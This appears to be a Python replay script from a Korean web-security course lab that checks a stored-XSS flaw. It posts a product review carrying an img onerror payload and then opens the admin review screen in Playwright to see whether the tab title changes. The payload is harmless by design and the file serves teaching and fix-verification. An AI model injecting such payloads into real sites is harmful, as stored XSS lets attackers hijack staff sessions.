"""T07 · 고객이 쓴 상품 후기가 관리자 화면에서 실행됨(저장형 XSS, A05). 수업 3-4(출력)·3-5(CSP).

alice가 HTML 태그가 섞인 가짜 후기를 쓴다([교육용 추가] POST /daon/review). 상품 담당 직원(staff_goods)이 관리자 화면
「상품 후기(교육용)」(127.0.0.1:8090/#/daon-review)를 진짜 브라우저(Playwright)로 연다.
후기 속 랩 표시용 스크립트가 실행되어 탭 이름(document.title)이 바뀌면 레드. 스크립트는 화면 표시만 바꾸고 밖으로 아무것도 보내지 않는다.
"""
from __future__ import annotations

import uuid

from replay import NotReady, Result
from replay import _browser
from replay._http import portal, portal_login

T = "T07"
TITLE = "상품 후기가 관리자 화면에서 실행됨(저장형 XSS)"
LESSON = "3-4·3-5"
SOURCE = "[교육용 추가] 후기 쓰기 API + 관리자 후기 화면의 v-html · [원본 확인됨] 관리자 토큰이 스크립트가 읽는 저장소에(F12)"
STACKS = ("spring",)

WRITER = "alice"
VIEWER = "staff_goods"
PRODUCT_ID = 201
LAB_TITLE = "[교육용 랩] 후기 스크립트가 실행됨"
# 재연이 쓰는 후기 본문(교재·영상에는 싣지 않는다). 이미지 오류 처리기가 탭 이름만 바꾼다
PAYLOAD = "배송 빨라요 <img src=\"x\" onerror=\"document.title='" + LAB_TITLE + "'\"> 재연 {ref}"


def write_review(content: str, user: str = WRITER, product_id: int = PRODUCT_ID, star: int = 5) -> dict:
    with portal() as c:
        token = portal_login(c, user)
        r = c.post("/daon/review", json={"productId": product_id, "star": star, "content": content},
                   headers={"Authorization": token})
        try:
            return r.json()
        except ValueError:
            return {"code": r.status_code, "message": r.text[:120]}


def run(stack: str = "spring") -> Result:
    if stack not in STACKS:
        raise NotReady(f"{T} {stack} 재연은 아직 없습니다(EverShop에는 후기 모듈이 없다, lessons/s3-04.md).")
    ref = uuid.uuid4().hex[:8]
    res = write_review(PAYLOAD.format(ref=ref))
    if res.get("code") != 200:
        raise NotReady(f"후기를 쓰지 못했습니다: {res.get('message')}")
    rid = res["data"]["id"]
    ev = [f"요청: {WRITER} 토큰으로 POST /daon/review  (상품 {PRODUCT_ID}, 태그가 섞인 가짜 후기, 후기 번호 {rid})"]
    with _browser.admin_page(VIEWER) as page:
        _browser.open_reviews(page, rid)
        c = _browser.cell(page, f"review-content-{rid}")
        title = page.title()
        csp = len(_browser.csp_events(page))
    ran = title == LAB_TITLE
    ev.append(f"관리자 화면({VIEWER}) 후기 칸: 그려진 요소 {c['elements']}개 {c['tags'] or ''} · 글자 「{c['text'][:40]}」")
    ev.append(f"탭 이름: 「{title}」" + (" ← 후기 속 스크립트가 실행됨" if ran else ""))
    if csp:
        ev.append(f"현재 문서의 CSP 위반 이벤트 {csp}건(DOM, 첫 렌더부터 관찰)")
    if ran:
        return Result(True, "고객이 쓴 후기가 관리자 브라우저에서 스크립트로 실행됐다", ev)
    return Result(False, "관리자 화면에서 후기 속 스크립트가 실행되지 않는다", ev)
